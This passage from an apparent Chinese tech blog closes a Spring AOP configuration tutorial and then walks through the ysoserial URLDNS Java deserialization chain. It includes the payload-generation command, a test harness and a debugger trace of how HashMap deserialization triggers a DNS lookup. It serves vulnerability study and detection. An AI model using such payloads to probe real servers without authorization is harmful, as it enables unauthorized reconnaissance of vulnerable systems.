<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    注册bean--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userservice&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.UserService&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--  方法二:AOP配置--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 注册bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;diy&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.DiyPointCut&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;diy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;diyPointCut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* org.example.learn.UserService.*(..))&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;before&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;diyPointCut&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;after&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;diyPointCut&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">TestService2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">cx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;aopContext2.xml&quot;</span>);</span><br><span class="line">    <span class="type">service1</span> <span class="variable">service</span> <span class="operator">=</span> (service1) cx.getBean(<span class="string">&quot;userservice&quot;</span>);</span><br><span class="line">    service.delete();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>业务接口和实现类同上</p>
<p>编写注解实现的增强类AnnotationPointCut.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.After;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Around;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Aspect;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Before;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnnotationPointCut</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;execution(* org.example.learn.UserService.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法执行前&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@After(&quot;execution(* org.example.learn.UserService.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;方法执行后&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Around(&quot;execution(* org.example.learn.UserService.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">around</span><span class="params">(ProceedingJoinPoint pj)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;环绕前&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;签名：&quot;</span>+pj.getSignature());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proceed</span> <span class="operator">=</span> pj.proceed();</span><br><span class="line">        System.out.println(<span class="string">&quot;环绕后&quot;</span>);</span><br><span class="line">        System.out.println(proceed);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在spring配置文件aopContext3.xml中，注册bean，并增加支持注解的支持</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    注册bean--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userservice&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.UserService&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--  方法三:AOP配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;annotationPointcut&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.AnnotationPointCut&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过aop命名空间的注解支持声明自动为spring容器中那些配置@aspectJ切面的bean创建代理，织入切面</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://springdoc.cn/">Spring 中文文档 (springdoc.cn)</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13584313.html">Java学习之Spring框架入门篇</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13591289.html">Java学习之Spring框架基础篇</a></p>
<p><a href="https://www.cnblogs.com/paidaxing0623/p/14312223.html">Bean的自动装配 - 天下御免 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/aishimin/p/14458639.html">AOP及实现方式 - aishimin - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/joy99/p/10941543.html">Spring AOP——Spring 中面向切面编程 - SharpCJ - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>Java基础</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化之URLDNS链</title>
    <url>/2023/01/09/Java-URLDNS/</url>
    <content><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><ul>
<li><strong>private void writeObject(ObjectOutputStream oos),自定义序列化</strong></li>
<li><strong>private void readObject(ObjectInputStream ois),自定义反序列化</strong></li>
</ul>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
<li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li>
<li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li>
<li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li>
</ul>
<p>github下载<a href="https://github.com/frohoff/ysoserial%E5%B9%B6%E5%AF%BC%E5%85%A5IDEA%EF%BC%8C%E5%8A%A0%E8%BD%BD%E9%A1%B9%E7%9B%AE%E4%BE%9D%E8%B5%96%E3%80%82">https://github.com/frohoff/ysoserial并导入IDEA，加载项目依赖。</a></p>
<p>本次环境JDK8</p>
<h1 id="运行生成Payload"><a href="#运行生成Payload" class="headerlink" title="运行生成Payload"></a>运行生成Payload</h1><p>Payload生成函数入口：GeneratePayload.class中的main函数，配置参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230509192147.png"></p>
<p>运行即可生成序列化后的payload</p>
<p>分析GeneratePayload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (args.length != <span class="number">2</span>) &#123;</span><br><span class="line">        printUsage();</span><br><span class="line">        System.exit(USAGE_CODE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// eg: URLDNS https://www.baidu.com</span></span><br><span class="line">    <span class="comment">// payloadType = URLDNS</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">payloadType</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// command = https://www.baidu.com</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// payloadClass = &quot;class ysoserial.payloads.URLDNS&quot;</span></span><br><span class="line">    <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">ObjectPayload</span>&gt; payloadClass = Utils.getPayloadClass(payloadType);</span><br><span class="line">    <span class="keyword">if</span> (payloadClass == <span class="literal">null</span>) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Invalid payload type &#x27;&quot;</span> + payloadType + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        printUsage();</span><br><span class="line">        System.exit(USAGE_CODE);</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// make null analysis happy</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 类实例</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectPayload</span> <span class="variable">payload</span> <span class="operator">=</span> payloadClass.newInstance();</span><br><span class="line">        <span class="comment">// 获取HashMap对象</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line">        <span class="type">PrintStream</span> <span class="variable">out</span> <span class="operator">=</span> System.out;</span><br><span class="line">        <span class="comment">// 将HashMap对象序列化输出</span></span><br><span class="line">        Serializer.serialize(object, out);</span><br><span class="line">        ObjectPayload.Utils.releasePayload(payload, object);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Error while generating or serializing payload&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        System.exit(INTERNAL_ERROR_CODE);</span><br><span class="line">    &#125;</span><br><span class="line">    System.exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点关注13行<code>final Class&lt;? extends ObjectPayload&gt; payloadClass = Utils.getPayloadClass(payloadType);</code>通过java的反射机制获取对应类名的class对象</p>
<p>其次关注25行<code>final Object object = payload.getObject(command);</code>将输入的URL作为参数，调用URLDNS对象中的getobject方法获取HashMap对象</p>
<p><code>Serializer.serialize(object, out);</code>将HashMap对象序列化成字节码，调用ObjectOutputStream的wirteObject函数</p>
<h1 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h1><p>借助ysoserial的jar包生成payload并将其保存至shell.txt</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar URLDNS &quot;http://fast.eyes.sh&quot; &gt; shell.txt</span><br></pre></td></tr></table></figure>

<p>编写反序列化测试demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.secmgr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNSTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:/webtool/java/shell.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">bit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        bit.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化将字节转化成对象通过readObject，这里再<code>bit.readObject();</code>下断点，同时在HashMap的readObject函数下断点</p>
<p>运行至<code>bit.readObject();</code>，F7步入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">    lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">    HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">    reinitialize();</span><br><span class="line"></span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// use defaults</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的readObject将读入的字节流转化成为对象，重点关注41行for循环<code>for (int i = 0; i &lt; mappings; i++)</code>之后的代码，这里的for循环逐一读取mappings中的键值对，重点在于<code>putVal(hash(key), key, value, false, false);</code>，putVal方法是往HashMap中存放键值对，而这里对key进行了hash计算，这里的key正是传入的URL对象</p>
<p>逐步F8来到putVal函数处，点击hash来到代码处，下断点F7跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了key的hashCode，这里的key是URL对象，跟进查看URL类中的hashCode方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// / synchronized 关键字修饰的方法为同步方法。当synchronized方法执行完或发生异常时，会自动释放锁</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意这里的<strong>hashCode要等于-1</strong>，这样才会执行hashCode &#x3D; handler.hashCode(this);</p>
<p>继续跟进代码，发现handler是URLStreamHandler对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>u是之前传入的URL，跟进<code>InetAddress addr = getHostAddress(u);</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> u.getHostAddress();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进，到了URL类中的getHostAddress方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hostAddress != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> hostAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        hostAddress = InetAddress.getByName(host);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>hostAddress = InetAddress.getByName(host);</code>中，<code>InetAddress.getByName</code>方法会使用远程请求，进行获取主机的ip</p>
<p>这是正面的链分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap:readObject                        必须要有一对键值对</span><br><span class="line">HashMap:putVal                            需要对Key调用一次hash方法</span><br><span class="line">HashMap:hash                              key不能等于null  且这里的key需要是URL对象</span><br><span class="line">URL:hashcode                              hashCode需要为-1</span><br><span class="line">URLStreamHandler.hashCode()               handler要为URLStreamHandler对象</span><br><span class="line">URLStreamHandler.hashCode().getHostAddress    </span><br><span class="line">URLStreamHandler.hashCode().getHostAddress.InetAddress.getByName</span><br></pre></td></tr></table></figure>

<p>这就是整个过程的调用链</p>
<h1 id="Payload生成分析"><a href="#Payload生成分析" class="headerlink" title="Payload生成分析"></a>Payload生成分析</h1><p>在第二节中讲述了Payload设生成的主函数，关键代码<code>final Object object = payload.getObject(command);</code>是获取HashMap对象的，分析URLDNS中的getObject代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">    <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">    <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">    <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">    ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询，同时也能理解为什么需要将hashCode设置为-1了，这样可以在反序列化的时候调用putVal重新调用hashCode函数，由于这里的hashCode是private属性，故这里使用反射来修改其值</p>
<p>另外为了避免本次put照成请求，ysoserial使用<code>SilentURLStreamHandler</code> 方法，直接返回null</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果需要在生成payload的类中进行调试，需要将<code>protected synchronized InetAddress getHostAddress(URL u) </code>注释即可</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/9417">Java反序列化 — URLDNS利用链分析 - 先知社区 (aliyun.com)</a></p>
